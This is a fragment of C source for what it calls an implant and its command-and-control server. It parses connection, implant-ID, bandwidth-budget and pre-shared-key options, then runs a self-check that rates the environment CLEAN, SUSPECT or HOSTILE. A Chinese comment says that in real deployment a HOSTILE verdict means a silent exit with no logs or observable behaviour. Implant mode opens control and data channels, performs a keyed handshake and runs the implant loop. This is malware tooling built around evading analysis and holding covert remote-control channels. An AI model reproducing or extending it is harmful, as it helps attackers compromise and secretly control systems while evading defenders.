        else if (!strcmp(argv[i], "--host") && i + 1 < argc)
            snprintf(cfg.host, sizeof cfg.host, "%s", argv[++i]);
        else if (!strcmp(argv[i], "--port") && i + 1 < argc)
            cfg.port = (uint16_t)strtoul(argv[++i], NULL, 10);
        else if (!strcmp(argv[i], "--id") && i + 1 < argc)
            snprintf(cfg.implant_id, sizeof cfg.implant_id, "%s", argv[++i]);
        else if (!strcmp(argv[i], "--src") && i + 1 < argc)
            snprintf(cfg.src, sizeof cfg.src, "%s", argv[++i]);
        else if (!strcmp(argv[i], "--run-ms") && i + 1 < argc)
            cfg.run_ms = (uint32_t)strtoul(argv[++i], NULL, 10);
        else if (!strcmp(argv[i], "--budget") && i + 1 < argc)
            cfg.budget_bpm = (uint32_t)strtoul(argv[++i], NULL, 10);
        else if (!strcmp(argv[i], "--period") && i + 1 < argc)
            cfg.period_ms = (uint32_t)strtoul(argv[++i], NULL, 10);
        else if (!strcmp(argv[i], "--psk-hex") && i + 1 < argc) {
            const char *h = argv[++i];
            size_t n = 0;
            while (h[2 * n] && h[2 * n + 1] && n < sizeof cfg.psk) {
                unsigned b = 0;
                if (sscanf(h + 2 * n, "%2x", &b) != 1) break;
                cfg.psk[n++] = (uint8_t)b;
            }
            if (n >= C2_PSK_MIN_LEN) cfg.psk_len = n;
        } else if (!strcmp(argv[i], "--help")) { usage(argv[0]); return 0; }
        else { usage(argv[0]); return 2; }
    }

    why[0] = '\0';
    if (defense_selfcheck(&verdict, why, sizeof why) != 0) return 2;

    if (mode == 3) {
        printf("verdict=%d (%s) why=%s\n", verdict,
               verdict == DF_CLEAN ? "CLEAN" :
               verdict == DF_SUSPECT ? "SUSPECT" : "HOSTILE",
               why[0] ? why : "-");
        return 0;
    }

    /*
     * 真实部署：HOSTILE 立即静默退出，不落日志、不打印、不产生可观测行为。
     * --allow-sandbox 只放宽"沙箱命中"这一项（本环境就是容器），
     * 不改变 HOSTILE 的整体判定逻辑。
     */
    if (verdict == DF_HOSTILE && !cfg.allow_sandbox) return 0;

    if (mode == 2) {
        int r;
        cfg.fast = 1;   /* 自测必须秒级返回，不得依赖默认 1 秒采集间隔 */
        r = run_selftest(&cfg);
        if (cfg.verbose)
            fprintf(stderr, "[selftest] rc=%d %s\n", r, r == 0 ? "PASS" : "FAIL");
        return r == 0 ? 0 : 1;
    }

    if (mode == 1) {
        int lfd, cfd, dfd;
        struct sockaddr_in sa;
        int one = 1;
        c2_session_keys_t sk;
        uint8_t tsc[32];
        uint8_t pfx[8];
        char iid[64];
        uint64_t fr = 0;
        int r;

        lfd = socket(AF_INET, SOCK_STREAM, 0);
        if (lfd < 0) return 2;
        setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
        memset(&sa, 0, sizeof sa);
        sa.sin_family = AF_INET;
        sa.sin_port = htons(cfg.port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(lfd, (struct sockaddr *)&sa, sizeof sa) != 0) return 2;
        if (listen(lfd, 4) != 0) return 2;

        fprintf(stderr, "[server] 监听 127.0.0.1:%u\n", cfg.port);
        cfd = accept(lfd, NULL, NULL);
        if (cfd < 0) return 2;
        fprintf(stderr, "[server] accept#1 fd=%d\n", cfd);
        dfd = accept(lfd, NULL, NULL);
        if (dfd < 0) { close(cfd); return 2; }
        fprintf(stderr, "[server] accept#2 fd=%d\n", dfd);
        close(lfd);

        r = hs_server(cfd, &cfg, &sk, pfx, tsc, iid, sizeof iid);
        if (r != 0) { fprintf(stderr, "[server] 握手失败 rc=%d\n", r); return 1; }
        fprintf(stderr, "[server] 握手完成 implant_id=%s\n", iid);
        r = server_run(cfd, dfd, &cfg, &sk, tsc, &fr);
        memset(&sk, 0, sizeof sk);
        close(cfd); close(dfd);
        return r == 0 ? 0 : 1;
    }

    /* implant 模式：两条连接 */
    {
        int cfd, dfd;
        c2_session_keys_t sk;
        uint8_t tsc[32], pfx[8];
        uint64_t fr = 0;
        int r;

        cfd = tcp_connect(&cfg);
        if (cfd < 0) { fprintf(stderr, "[implant] 控制面连接失败\n"); return 1; }
        dfd = tcp_connect(&cfg);
        if (dfd < 0) { close(cfd); fprintf(stderr, "[implant] 数据面连接失败\n"); return 1; }

        r = hs_implant(cfd, &cfg, &sk, pfx, tsc);
        if (r != 0) { fprintf(stderr, "[implant] 握手失败 rc=%d\n", r); return 1; }
        if (cfg.verbose) fprintf(stderr, "[implant] 握手完成\n");

        r = implant_run(cfd, dfd, &cfg, &sk, tsc, &fr);
        memset(&sk, 0, sizeof sk);
        close(cfd); close(dfd);
        return r == 0 ? 0 : 1;
    }
}
